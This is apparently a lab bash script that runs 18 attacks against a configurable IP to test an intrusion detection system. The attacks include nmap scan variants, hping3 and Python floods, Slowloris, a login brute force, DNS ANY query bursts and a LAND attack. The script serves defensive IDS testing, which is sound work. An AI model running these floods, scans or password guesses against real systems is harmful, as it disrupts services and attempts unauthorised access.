#!/bin/bash

# IDS Attack Scripts - Designed to trigger IDS detection
# Run these from Kali Linux or Attacker VM

TARGET="${1:-192.168.100.4}"  # Default IDS server IP
PORT="${2:-5001}"              # Default backend port

echo "=========================================="
echo "IDS Attack Scripts"
echo "Target: $TARGET"
echo "Port: $PORT"
echo "=========================================="
echo ""
echo "⚠️  IMPORTANT: Make sure you set the correct IDS VM IP!"
echo "   Run: ./attack_scripts.sh <IDS_VM_IP>"
echo "   Or edit the script to set TARGET variable"
echo ""

# Function to check if target is reachable
check_target() {
    echo "Testing connectivity to $TARGET..."
    if ! ping -c 3 -W 2 $TARGET >/dev/null 2>&1; then
        echo ""
        echo "❌ ERROR: Cannot reach $TARGET"
        echo ""
        echo "Troubleshooting:"
        echo "1. Make sure both VMs are on the same network"
        echo "2. Check IDS VM IP: Run 'hostname -I' on IDS VM"
        echo "3. Try: ping <IDS_VM_IP> from this VM"
        echo "4. Check firewall: sudo ufw status"
        echo ""
        exit 1
    fi
    echo "✅ Target $TARGET is reachable"
    echo ""
}

# Attack 1: Port Scan (Detected as "probe" or "port_scan")
attack_port_scan() {
    echo ""
    echo "=========================================="
    echo "ATTACK 1: Port Scan (Should trigger 'port_scan' detection)"
    echo "=========================================="
    echo "Scanning ports 1-100 on $TARGET..."
    echo "This should be detected as a port scan attack"
    echo "Watch the IDS dashboard - you should see alerts IMMEDIATELY!"
    echo ""
    
    # Fast scan to trigger detection quickly
    nmap -p 1-100 -T5 $TARGET 2>&1
    
    echo ""
    echo "✅ Port scan complete. Check IDS dashboard NOW for 'port_scan' detection."
    echo "   You should see alerts in the Security Alerts page and Dashboard!"
    echo ""
}

# Attack 2: SYN Flood (Detected as "dos" or "ddos")
attack_syn_flood() {
    echo ""
    echo "=========================================="
    echo "ATTACK 2: SYN Flood (Should trigger 'dos' detection)"
    echo "=========================================="
    echo "Starting SYN flood on $TARGET:$PORT..."
    echo "This should be detected as DoS attack IMMEDIATELY"
    echo "Watch the IDS dashboard - alerts should appear in real-time!"
    echo ""
    
    # Try hping3 with sudo first (requires root for raw sockets)
    if command -v hping3 >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
        echo "Using hping3 (requires sudo)..."
        timeout 30 sudo hping3 -S -p $PORT --flood $TARGET 2>/dev/null || true
    elif command -v hping3 >/dev/null 2>&1; then
        echo "⚠️  hping3 requires sudo. Trying alternative method..."
        echo "   (Run with: sudo ./attack_scripts.sh $TARGET $PORT)"
        # Fall through to Python method
    fi
    
    # Alternative: Use Python script (doesn't require root)
    if command -v python3 >/dev/null 2>&1; then
        echo "Using Python SYN flood (no root required)..."
        python3 << EOF
import socket
import time
import sys

target = "$TARGET"
port = $PORT
duration = 30

print(f"Sending SYN packets to {target}:{port} for {duration} seconds...")
start_time = time.time()
count = 0

try:
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((target, port))
            s.close()
            count += 1
            if count % 100 == 0:
                print(f"  Sent {count} connections...")
        except:
            pass
        time.sleep(0.01)
except KeyboardInterrupt:
    pass

print(f"\\n✅ Sent {count} connections. Check IDS dashboard for 'dos' detection.")
EOF
    else
        # Last resort: Use bash TCP connections
        echo "Using bash TCP connections..."
        start_time=$(date +%s)
        count=0
        while [ $(($(date +%s) - start_time)) -lt 30 ]; do
            timeout 0.1 bash -c "echo > /dev/tcp/$TARGET/$PORT" 2>/dev/null && count=$((count + 1)) || true
            if [ $((count % 100)) -eq 0 ]; then
                echo "  Sent $count connections..."
            fi
            sleep 0.01
        done
        echo "✅ Sent $count connections. Check IDS dashboard for 'dos' detection."
    fi
    
    echo ""
    echo "✅ SYN flood complete. Check IDS dashboard for 'dos' detection."
    echo ""
}

# Attack 3: HTTP Flood (Detected as "dos" or "ddos")
attack_http_flood() {
    echo ""
    echo "=========================================="
    echo "ATTACK 3: HTTP Flood (Should trigger 'dos' detection)"
    echo "=========================================="
    echo "Sending 2000 HTTP requests to $TARGET:$PORT..."
    echo "This should be detected as DoS attack"
    echo ""
    
    for i in {1..2000}; do
        curl -s -m 2 http://$TARGET:$PORT/ >/dev/null 2>&1 &
        if [ $((i % 200)) -eq 0 ]; then
            echo "  Sent $i requests..."
        fi
    done
    wait
    
    echo ""
    echo "✅ HTTP flood complete. Check IDS dashboard for 'dos' detection."
    echo ""
}

# Attack 4: ICMP Ping Flood (Detected as "dos")
attack_ping_flood() {
    echo ""
    echo "=========================================="
    echo "ATTACK 4: ICMP Ping Flood (Should trigger 'dos' detection)"
    echo "=========================================="
    echo "Sending 1000 ping packets to $TARGET..."
    echo "This should be detected as DoS attack"
    echo ""
    
    ping -f -c 1000 $TARGET 2>/dev/null || hping3 -1 --flood -c 1000 $TARGET 2>/dev/null || true
    
    echo ""
    echo "✅ Ping flood complete. Check IDS dashboard for 'dos' detection."
    echo ""
}

# Attack 5: Rapid Port Scan (Detected as "port_scan")
attack_rapid_scan() {
    echo ""
    echo "=========================================="
    echo "ATTACK 5: Rapid Port Scan (Should trigger 'port_scan' detection)"
    echo "=========================================="
    echo "Rapidly scanning common ports on $TARGET..."
    echo "This should be detected as port scan"
    echo ""
    
    # Scan common ports rapidly
    for port in 22 23 25 53 80 135 139 443 445 1433 3306 3389 5432; do
        timeout 1 bash -c "echo > /dev/tcp/$TARGET/$port" 2>/dev/null && echo "Port $port: OPEN" || echo "Port $port: closed"
    done
    
    # Also use nmap for more detection
    nmap -p 20,21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432 -T5 $TARGET
    
    echo ""
    echo "✅ Rapid scan complete. Check IDS dashboard for 'port_scan' detection."
    echo ""
}

# Attack 6: Mixed Attack (Multiple attack types)
attack_mixed() {
    echo ""
    echo "=========================================="
    echo "ATTACK 6: Mixed Attack (Multiple attack types)"
    echo "=========================================="
    echo "Running multiple attacks simultaneously..."
    echo "This should trigger multiple detections"
    echo ""
    
    # Start multiple attacks in background
    echo "  [1/3] Starting port scan..."
    nmap -p 1-500 -T5 $TARGET >/dev/null 2>&1 &
    SCAN_PID=$!
    
    sleep 2
    
    echo "  [2/3] Starting SYN flood..."
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import socket, time
target = '$TARGET'
port = $PORT
start = time.time()
while time.time() - start < 20:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.1)
        s.connect((target, port))
        s.close()
    except: pass
    time.sleep(0.01)
" >/dev/null 2>&1 &
    else
        timeout 20 hping3 -S -p $PORT --flood $TARGET >/dev/null 2>&1 &
    fi
    SYN_PID=$!
    
    sleep 2
    
    echo "  [3/3] Starting HTTP flood..."
    for i in {1..500}; do
        curl -s -m 1 http://$TARGET:$PORT/ >/dev/null 2>&1 &
    done
    
    echo ""
    echo "Attacks running... Waiting 25 seconds..."
    sleep 25
    
    # Cleanup
    kill $SCAN_PID 2>/dev/null || true
    kill $SYN_PID 2>/dev/null || true
    pkill hping3 2>/dev/null || true
    
    echo ""
    echo "✅ Mixed attack complete. Check IDS dashboard for multiple detections."
    echo ""
}

# Attack 7: Slow Port Scan (Stealth scan)
attack_stealth_scan() {
    echo ""
    echo "=========================================="
    echo "ATTACK 7: Stealth Port Scan (Should still be detected)"
    echo "=========================================="
    echo "Slow stealth scan to avoid detection..."
    echo "IDS should still detect this pattern"
    echo ""
    
    nmap -p 1-1000 -sS -T2 $TARGET
    
    echo ""
    echo "✅ Stealth scan complete. Check IDS dashboard."
    echo ""
}

# Attack 8: UDP Flood (Detected as "dos")
attack_udp_flood() {
    echo ""
    echo "=========================================="
    echo "ATTACK 8: UDP Flood (Should trigger 'dos' detection)"
    echo "=========================================="
    echo "Sending UDP packets to $TARGET..."
    echo "This should be detected as DoS attack"
    echo ""
    
    if command -v hping3 >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
        echo "Using hping3 UDP flood..."
        timeout 30 sudo hping3 --udp -p 53 --flood $TARGET 2>/dev/null || true
    else
        echo "Using Python UDP flood..."
        python3 << EOF
import socket
import time

target = "$TARGET"
port = 53
duration = 30
count = 0

print(f"Sending UDP packets to {target}:{port}...")
start_time = time.time()

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time() - start_time < duration:
        try:
            sock.sendto(b'UDP FLOOD', (target, port))
            count += 1
            if count % 100 == 0:
                print(f"  Sent {count} UDP packets...")
        except:
            pass
        time.sleep(0.01)
    sock.close()
except KeyboardInterrupt:
    pass

print(f"\\n✅ UDP flood complete. Sent {count} packets.")
EOF
    fi
    
    echo ""
    echo "✅ UDP flood complete. Check IDS dashboard for 'dos' detection."
    echo ""
}

# Attack 9: Slowloris (Detected as "dos")
attack_slowloris() {
    echo ""
    echo "=========================================="
    echo "ATTACK 9: Slowloris (Should trigger 'dos' detection)"
    echo "=========================================="
    echo "Opening slow HTTP connections to $TARGET:$PORT..."
    echo "This should be detected as DoS attack"
    echo ""
    
    if command -v python3 >/dev/null 2>&1; then
        python3 << EOF
import socket
import time
import threading

target = "$TARGET"
port = $PORT
sockets = []

def create_slow_connection(i):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /?{i} HTTP/1.1\\r\\n".encode())
        s.send(f"Host: {target}\\r\\n".encode())
        s.send("User-Agent: Mozilla/5.0\\r\\n".encode())
        sockets.append(s)
        print(f"  Connection {i} established")
    except:
        pass

print("Creating 200 slow connections...")
threads = []
for i in range(200):
    t = threading.Thread(target=create_slow_connection, args=(i,))
    t.start()
    threads.append(t)
    time.sleep(0.1)

print(f"\\n✅ Slowloris started. Keeping {len(sockets)} connections open for 30 seconds...")
time.sleep(30)

for s in sockets:
    try:
        s.close()
    except:
        pass

print("✅ Slowloris complete.")
EOF
    else
        echo "Python3 required for Slowloris attack"
    fi
    
    echo ""
    echo "✅ Slowloris complete. Check IDS dashboard for 'dos' detection."
    echo ""
}

# Attack 10: Brute Force Simulation (Detected as "brute_force" or "r2l")
attack_brute_force() {
    echo ""
    echo "=========================================="
    echo "ATTACK 10: Brute Force (Should trigger 'brute_force' detection)"
    echo "=========================================="
    echo "Simulating login attempts to $TARGET:$PORT..."
    echo "This should be detected as brute force attack"
    echo ""
    
    if command -v curl >/dev/null 2>&1; then
        common_passwords=("admin" "password" "123456" "root" "test" "admin123" "password123")
        for i in {1..300}; do
            pwd=${common_passwords[$((i % ${#common_passwords[@]}))]}
            curl -s -m 1 -X POST http://$TARGET:$PORT/api/auth/login \
                -H "Content-Type: application/json" \
                -d "{\"email\":\"admin@test.com\",\"password\":\"$pwd\"}" >/dev/null 2>&1 &
            if [ $((i % 50)) -eq 0 ]; then
                echo "  Attempted $i logins..."
            fi
        done
        wait
    else
        echo "curl required for brute force attack"
    fi
    
    echo ""
    echo "✅ Brute force complete. Check IDS dashboard for 'brute_force' detection."
    echo ""
}

# Attack 11: DNS Amplification (Detected as "dos")
attack_dns_amplification() {
    echo ""
    echo "=========================================="
    echo "ATTACK 11: DNS Amplification (Should trigger 'dos' detection)"
    echo "=========================================="
    echo "Sending DNS queries to $TARGET..."
    echo "This should be detected as DoS attack"
    echo ""
    
    if command -v dig >/dev/null 2>&1; then
        for i in {1..500}; do
            dig @$TARGET google.com ANY >/dev/null 2>&1 &
            if [ $((i % 100)) -eq 0 ]; then
                echo "  Sent $i DNS queries..."
            fi
        done
        wait
    else
        echo "dig required for DNS amplification attack"
    fi
    
    echo ""
    echo "✅ DNS amplification complete. Check IDS dashboard for 'dos' detection."
    echo ""
}

# Attack 12: ARP Spoofing Simulation (Detected as "suspicious_traffic")
attack_arp_spoof() {
    echo ""
    echo "=========================================="
    echo "ATTACK 12: ARP Spoofing Simulation (Should trigger detection)"
    echo "=========================================="
    echo "Simulating ARP spoofing by sending many ARP requests..."
    echo "This should be detected as suspicious traffic"
    echo ""
    
    if command -v arping >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
        echo "Using arping for ARP spoofing simulation..."
        for i in {1..200}; do
            sudo arping -c 1 -I eth0 $TARGET >/dev/null 2>&1 &
            if [ $((i % 50)) -eq 0 ]; then
                echo "  Sent $i ARP requests..."
            fi
        done
        wait
    else
        echo "arping with sudo required for ARP spoofing attack"
        echo "Or use: sudo ./attack_scripts.sh $TARGET $PORT"
    fi
    
    echo ""
    echo "✅ ARP spoofing simulation complete. Check IDS dashboard."
    echo ""
}

# Attack 13: Fragmented Packet Attack (Detected as "dos")
attack_fragmented() {
    echo ""
    echo "=========================================="
    echo "ATTACK 13: Fragmented Packet Attack (Should trigger 'dos' detection)"
    echo "=========================================="
    echo "Sending fragmented packets to $TARGET..."
    echo "This should be detected as DoS attack"
    echo ""
    
    if command -v hping3 >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
        echo "Using hping3 for fragmented packets..."
        timeout 30 sudo hping3 -f -p $PORT --flood $TARGET 2>/dev/null || true
    else
        echo "hping3 with sudo required for fragmented packet attack"
    fi
    
    echo ""
    echo "✅ Fragmented packet attack complete. Check IDS dashboard for 'dos' detection."
    echo ""
}

# Attack 14: Land Attack (Detected as "dos")
attack_land() {
    echo ""
    echo "=========================================="
    echo "ATTACK 14: Land Attack (Should trigger 'dos' detection)"
    echo "=========================================="
    echo "Sending LAND attack packets to $TARGET..."
    echo "This should be detected as DoS attack"
    echo ""
    
    if command -v hping3 >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
        echo "Using hping3 for LAND attack..."
        timeout 30 sudo hping3 -a $TARGET -p $PORT -s $PORT -S $TARGET 2>/dev/null || true
    else
        echo "hping3 with sudo required for LAND attack"
    fi
    
    echo ""
    echo "✅ LAND attack complete. Check IDS dashboard for 'dos' detection."
    echo ""
}

# Attack 15: Xmas Tree Scan (Detected as "port_scan" or "probe")
attack_xmas_scan() {
    echo ""
    echo "=========================================="
    echo "ATTACK 15: Xmas Tree Scan (Should trigger 'port_scan' detection)"
    echo "=========================================="
    echo "Performing Xmas tree scan on $TARGET..."
    echo "This should be detected as port scan"
    echo ""
    
    if command -v nmap >/dev/null 2>&1; then
        nmap -sX -p 1-100 $TARGET
    else
        echo "nmap required for Xmas tree scan"
    fi
    
    echo ""
    echo "✅ Xmas tree scan complete. Check IDS dashboard for 'port_scan' detection."
    echo ""
}

# Attack 16: FIN Scan (Detected as "port_scan" or "probe")
attack_fin_scan() {
    echo ""
    echo "=========================================="
    echo "ATTACK 16: FIN Scan (Should trigger 'port_scan' detection)"
    echo "=========================================="
    echo "Performing FIN scan on $TARGET..."
    echo "This should be detected as port scan"
    echo ""
    
    if command -v nmap >/dev/null 2>&1; then
        nmap -sF -p 1-100 $TARGET
    else
        echo "nmap required for FIN scan"
    fi
    
    echo ""
    echo "✅ FIN scan complete. Check IDS dashboard for 'port_scan' detection."
    echo ""
}

# Attack 17: NULL Scan (Detected as "port_scan" or "probe")
attack_null_scan() {
    echo ""
    echo "=========================================="
    echo "ATTACK 17: NULL Scan (Should trigger 'port_scan' detection)"
    echo "=========================================="
    echo "Performing NULL scan on $TARGET..."
    echo "This should be detected as port scan"
    echo ""
    
    if command -v nmap >/dev/null 2>&1; then
        nmap -sN -p 1-100 $TARGET
    else
        echo "nmap required for NULL scan"
    fi
    
    echo ""
    echo "✅ NULL scan complete. Check IDS dashboard for 'port_scan' detection."
    echo ""
}

# Attack 18: ACK Scan (Detected as "port_scan" or "probe")
attack_ack_scan() {
    echo ""
    echo "=========================================="
    echo "ATTACK 18: ACK Scan (Should trigger 'port_scan' detection)"
    echo "=========================================="
    echo "Performing ACK scan on $TARGET..."
    echo "This should be detected as port scan"
    echo ""
    
    if command -v nmap >/dev/null 2>&1; then
        nmap -sA -p 1-100 $TARGET
    else
        echo "nmap required for ACK scan"
    fi
    
    echo ""
    echo "✅ ACK scan complete. Check IDS dashboard for 'port_scan' detection."
    echo ""
}

# Main menu
show_menu() {
    echo ""
    echo "Select attack to run:"
    echo "  1) Port Scan (port_scan detection)"
    echo "  2) SYN Flood (dos detection)"
    echo "  3) HTTP Flood (dos detection)"
    echo "  4) ICMP Ping Flood (dos detection)"
    echo "  5) Rapid Port Scan (port_scan detection)"
    echo "  6) Mixed Attack (multiple detections)"
    echo "  7) Stealth Port Scan (port_scan detection)"
    echo "  8) UDP Flood (dos detection)"
    echo "  9) Slowloris (dos detection)"
    echo " 10) Brute Force (brute_force detection)"
    echo " 11) DNS Amplification (dos detection)"
    echo " 12) ARP Spoofing (suspicious_traffic)"
    echo " 13) Fragmented Packet Attack (dos detection)"
    echo " 14) LAND Attack (dos detection)"
    echo " 15) Xmas Tree Scan (port_scan detection)"
    echo " 16) FIN Scan (port_scan detection)"
    echo " 17) NULL Scan (port_scan detection)"
    echo " 18) ACK Scan (port_scan detection)"
    echo " 19) Run ALL attacks sequentially"
    echo " 20) Exit"
    echo ""
    read -p "Enter choice [1-20]: " choice
    
    case $choice in
        1) attack_port_scan ;;
        2) attack_syn_flood ;;
        3) attack_http_flood ;;
        4) attack_ping_flood ;;
        5) attack_rapid_scan ;;
        6) attack_mixed ;;
        7) attack_stealth_scan ;;
        8) attack_udp_flood ;;
        9) attack_slowloris ;;
        10) attack_brute_force ;;
        11) attack_dns_amplification ;;
        12) attack_arp_spoof ;;
        13) attack_fragmented ;;
        14) attack_land ;;
        15) attack_xmas_scan ;;
        16) attack_fin_scan ;;
        17) attack_null_scan ;;
        18) attack_ack_scan ;;
        19) 
            attack_port_scan
            sleep 5
            attack_syn_flood
            sleep 5
            attack_http_flood
            sleep 5
            attack_ping_flood
            sleep 5
            attack_rapid_scan
            sleep 5
            attack_udp_flood
            sleep 5
            attack_slowloris
            sleep 5
            attack_brute_force
            sleep 5
            attack_dns_amplification
            sleep 5
            attack_xmas_scan
            sleep 5
            attack_fin_scan
            sleep 5
            attack_null_scan
            sleep 5
            attack_ack_scan
            echo ""
            echo "=========================================="
            echo "✅ All attacks completed!"
            echo "Check your IDS dashboard for all detections."
            echo "=========================================="
            ;;
        20) echo "Exiting..."; exit 0 ;;
        *) echo "Invalid choice. Try again."; show_menu ;;
    esac
}

# Check if target is provided and reachable
if [ "$1" != "" ]; then
    check_target
fi

# If running with arguments, run specific attack
if [ "$3" != "" ]; then
    case $3 in
        scan) attack_port_scan ;;
        syn) attack_syn_flood ;;
        http) attack_http_flood ;;
        ping) attack_ping_flood ;;
        rapid) attack_rapid_scan ;;
        mixed) attack_mixed ;;
        stealth) attack_stealth_scan ;;
        udp) attack_udp_flood ;;
        slowloris) attack_slowloris ;;
        brute) attack_brute_force ;;
        dns) attack_dns_amplification ;;
        arp) attack_arp_spoof ;;
        frag) attack_fragmented ;;
        land) attack_land ;;
        xmas) attack_xmas_scan ;;
        fin) attack_fin_scan ;;
        null) attack_null_scan ;;
        ack) attack_ack_scan ;;
        all)
            attack_port_scan
            sleep 5
            attack_syn_flood
            sleep 5
            attack_http_flood
            sleep 5
            attack_ping_flood
            sleep 5
            attack_rapid_scan
            sleep 5
            attack_udp_flood
            sleep 5
            attack_slowloris
            sleep 5
            attack_brute_force
            sleep 5
            attack_dns_amplification
            ;;
        *) echo "Unknown attack type: $3"; exit 1 ;;
    esac
else
    # Show interactive menu
    while true; do
        show_menu
        echo ""
        read -p "Run another attack? (y/n): " again
        if [ "$again" != "y" ] && [ "$again" != "Y" ]; then
            break
        fi
    done
fi

echo ""
echo "=========================================="
echo "Attack session complete!"
echo "Check your IDS dashboard for detections:"
echo "  - Port scans should show 'port_scan' or 'probe'"
echo "  - Floods should show 'dos' or 'ddos'"
echo "  - Your IP should be auto-blocked"
echo "  - Notifications should appear"
echo "=========================================="

